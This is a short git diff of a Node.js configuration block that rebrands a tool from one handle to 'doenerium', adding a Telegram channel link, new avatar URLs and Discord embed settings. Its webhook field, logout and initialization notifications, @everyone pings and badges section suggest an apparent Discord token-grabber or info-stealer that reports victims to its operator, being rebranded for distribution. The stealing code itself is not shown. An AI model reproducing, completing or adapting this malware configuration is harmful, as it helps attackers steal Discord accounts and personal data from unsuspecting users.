@@ -11,7 +11,7 @@ const fs = require("fs");
 // Initialization
 
 var config = {
-    brand: "ᗪ₳R₭ ᗪΞVÏŁ$🗽! 𝑱𝑴𝑨𝑬𝑲𝑨.〆#2003",
+    brand: "doenerium",
 
     webhook: "",
 
@@ -20,16 +20,16 @@ var config = {
 
     notify_on_logout: true,
     notify_on_initialization: true,
-    ping: [true, "@here/@everyone"],
+    ping: [true, "@doener"],
 
     embed: {
-        username: "ᗪ₳R₭ ᗪΞVÏŁ$🗽! 𝑱𝑴𝑨𝑬𝑲𝑨.〆#2003 خـرفشُهツ#0001✌",
+        username: "doenerium | t.me/doenerium",
         footer: {
-            text: `ᗪ₳R₭ ᗪΞVÏŁ$🗽! 𝑱𝑴𝑨𝑬𝑲𝑨.〆#2003 خـرفشُهツ#0001✌`,
-            icon_url: "https://cdn.discordapp.com/avatars/895704973449494619/a_353d92690308e3241fbe1141cf65111b.gif?size=1024",
+            text: `doenerium | t.me/doenerium`,
+            icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
         },
-        href: "https://discord.gg/nrYgKrhuGU",
-        avatar_url: "https://cdn.discordapp.com/avatars/895704973449494619/a_353d92690308e3241fbe1141cf65111b.gif?size=1024"
+        href: "https://t.me/doenerium",
+        avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
     },
 
     badges: {
